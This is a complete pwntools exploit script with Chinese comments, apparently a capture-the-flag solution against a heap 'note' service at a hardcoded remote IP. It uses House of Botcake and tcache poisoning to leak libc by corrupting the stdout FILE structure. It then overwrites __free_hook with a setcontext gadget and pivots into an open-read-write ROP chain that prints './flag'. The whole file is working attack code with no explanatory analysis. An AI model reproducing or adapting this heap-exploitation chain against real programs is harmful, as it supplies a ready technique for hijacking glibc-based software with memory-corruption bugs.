from pwn import *
import time

context(arch='amd64', os='linux', log_level='info')

# libc-2.31 关键偏移
STDOUT_OFF = 0x1ed6a0
FREE_HOOK_OFF = 0x1eee48
# mov rdx,[rdi+8]; call [rdx+0x20]
MAGIC_OFF = 0x151bb0
# setcontext+61: 从 rdx 加载寄存器上下文
SETCTX61_OFF = 0x54f5d
POP_RDI = 0x23b6a
POP_RSI = 0x2601f
POP_RDX_RBX = 0x15fae6
POP_RAX = 0x36174
SYSCALL_RET = 0x630a9
RET_SLED = 0x22679

TARGET_HOST = '39.96.193.120'
TARGET_PORT = 10011


def xor_key(addr):
    return (addr >> 12)


def pwn1(tube, nib):
    """House of Botcake 泄露 libc"""

    def note_add(idx, sz, data=b'A'):
        tube.sendlineafter(b'Choice', b'1')
        tube.sendlineafter(b'Index', str(idx).encode())
        tube.sendlineafter(b'Size', str(sz).encode())
        tube.sendafter(b'Content', data.ljust(sz, b'\x00')[:sz])

    def note_del(idx):
        tube.sendlineafter(b'Choice', b'2')
        tube.sendlineafter(b'Index', str(idx).encode())

    def note_edit(idx, data):
        tube.sendlineafter(b'Choice', b'3')
        tube.sendlineafter(b'Index', str(idx).encode())
        tube.sendafter(b'Content', data)

    # 耗尽 seccomp 残留 tcache
    for sz in [0x08, 0x18, 0x28, 0x48, 0x58, 0x68, 0x78, 0x88, 0x98, 0xb8, 0xd8]:
        for _ in range(50):
            note_add(15, sz)

    # 布局: A(0x88,idx0) | B(0x98,idx1) | guard(0x20,idx3) | X(0x98,idx2)
    note_add(0, 0x88)
    note_add(1, 0x98)
    note_add(3, 0x20)
    note_add(2, 0x98)

    # 填满 tcache[0xa0] 和 tcache[0x90]
    for i in range(4, 11):
        note_add(i, 0x98)
    for i in range(4, 11):
        note_del(i)
    for i in range(4, 11):
        note_add(i, 0x88)
    for i in range(4, 11):
        note_del(i)

    # A+B 合并进 unsorted bin
    note_del(0)
    note_del(1)

    # drain tcache[0xa0]
    for i in range(4, 11):
        note_add(i, 0x98)

    # X 和 B 进 tcache[0xa0]，head=B
    note_del(2)
    note_del(1)

    # drain tcache[0x90]
    for i in range(4, 11):
        note_add(i, 0x88)

    # split AB，remainder 落在 B 位置，glibc 写 B.fd = main_arena+96
    note_add(0, 0x88)

    # partial overwrite B.fd 低 2 字节指向 stdout
    note_edit(1, p16((nib << 12) | 0x6a0))

    # pop B
    note_add(1, 0x98)

    # pop stdout，写 FILE 结构体触发 leak
    tube.sendlineafter(b'Choice', b'1')
    tube.sendlineafter(b'Index', b'0')
    tube.sendlineafter(b'Size', b'152')
    tube.sendafter(b'Content', p64(0xfbad1800) + p64(0) * 3 + b'\x00')

    time.sleep(0.5)
    leaked = tube.clean(timeout=2)
    if len(leaked) < 16:
        return None, note_add, note_del, note_edit

    # 从泄露数据中搜索 libc 指针
    libc_base = 0
    for i in range(0, len(leaked) - 7):
        val = u64(leaked[i:i + 8])
        if (val >> 40) == 0x7f:
            for off in [0x1ec980, 0x1ecbe0, 0x1ed6a0, 0x1ed5c0, 0x1ed4a0]:
                cand = val - off
                if cand > 0 and cand & 0xfff == 0:
                    libc_base = cand
                    break
            if libc_base:
                break

    return libc_base, note_add, note_del, note_edit


def pwn2(tube, libc_base, note_add, note_del, note_edit):
    """3 次 tcache poisoning 写 ORW payload 到 __free_hook 区域"""

    free_hook = libc_base + FREE_HOOK_OFF
    magic = libc_base + MAGIC_OFF
    setctx = libc_base + SETCTX61_OFF
    ret = libc_base + RET_SLED
    rop_start = free_hook + 0xb8
    flag_str = free_hook + 0x190
    read_buf = free_hook + 0x300

    # ORW ROP: open("./flag",0) -> read(3,buf,0x100) -> write(1,buf,0x100)
    chain = b''
    chain += p64(libc_base + POP_RDI) + p64(flag_str)
    chain += p64(libc_base + POP_RSI) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(2)
    chain += p64(libc_base + SYSCALL_RET)
    chain += p64(libc_base + POP_RDI) + p64(3)
    chain += p64(libc_base + POP_RSI) + p64(read_buf)
    chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(0)
    chain += p64(libc_base + SYSCALL_RET)
    chain += p64(libc_base + POP_RDI) + p64(1)
    chain += p64(libc_base + POP_RSI) + p64(read_buf)
    chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(1)
    chain += p64(libc_base + SYSCALL_RET)

    D = 0.3
    sl = lambda d: (tube.sendline(d), time.sleep(D))
    sd = lambda d: (tube.send(d), time.sleep(D))

    # --- 第一次 poisoning: free_hook+0x110 写 ROP 后半段 + flag 路径 ---
    sl(b'2'); sl(b'4')
    sl(b'2'); sl(b'5')
    sl(b'3'); sl(b'5'); sd(p64(free_hook + 0x110) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'4'); sl(b'136'); sd(b'\x00' * 0x88)
    block1 = bytearray(0x88)
    block1[0:len(chain[88:])] = chain[88:]
    block1[0x80:0x87] = b'./flag\x00'
    sl(b'1'); sl(b'5'); sl(b'136'); sd(bytes(block1))

    # --- 第二次 poisoning: free_hook+0x88 写 frame 尾部 + ROP 前半段 ---
    sl(b'2'); sl(b'6')
    sl(b'2'); sl(b'7')
    sl(b'3'); sl(b'7'); sd(p64(free_hook + 0x88) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'6'); sl(b'136'); sd(b'\x00' * 0x88)
    block2 = bytearray(0x88)
    block2[0x20:0x28] = p64(rop_start)  # [rdx+0xa0] = rsp
    block2[0x28:0x30] = p64(ret)        # [rdx+0xa8] = RIP
    block2[0x30:0x30 + 88] = chain[:88]
    sl(b'1'); sl(b'7'); sl(b'136'); sd(bytes(block2))

    # 准备 trigger chunk
    sl(b'3'); sl(b'10'); sd(p64(0) + p64(free_hook + 8) + b'\x00' * (0x88 - 16))

    # --- 第三次 poisoning: free_hook+0x00 写 magic_gadget + setcontext ---
    sl(b'2'); sl(b'8')
    sl(b'2'); sl(b'9')
    sl(b'3'); sl(b'9'); sd(p64(free_hook) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'8'); sl(b'136'); sd(b'\x00' * 0x88)
    block3 = bytearray(0x88)
    block3[0x00:0x08] = p64(magic)
    block3[0x28:0x30] = p64(setctx)
    sl(b'1'); sl(b'9'); sl(b'136'); sd(bytes(block3))

    # 触发: free(trigger) -> magic -> setcontext -> ROP -> ORW
    sl(b'2'); sl(b'10')


def pwn3(tube):
    """接收 flag 输出"""
    time.sleep(2)
    result = tube.recvall(timeout=5)
    if result:
        log.success(f"FLAG: {result}")
        return True
    return False


if __name__ == '__main__':
    for nib in range(16):
        log.info(f"nibble = {nib:#x}")
        try:
            tube = remote(TARGET_HOST, TARGET_PORT)
            libc_base, note_add, note_del, note_edit = pwn1(tube, nib)
            if not libc_base:
                tube.close()
                time.sleep(0.5)
                continue
            log.success(f"libc base: {hex(libc_base)}")
            pwn2(tube, libc_base, note_add, note_del, note_edit)
            if pwn3(tube):
                break
            tube.close()
        except Exception as e:
            log.warning(f"[{nib:#x}] {e}")
        time.sleep(0.5)
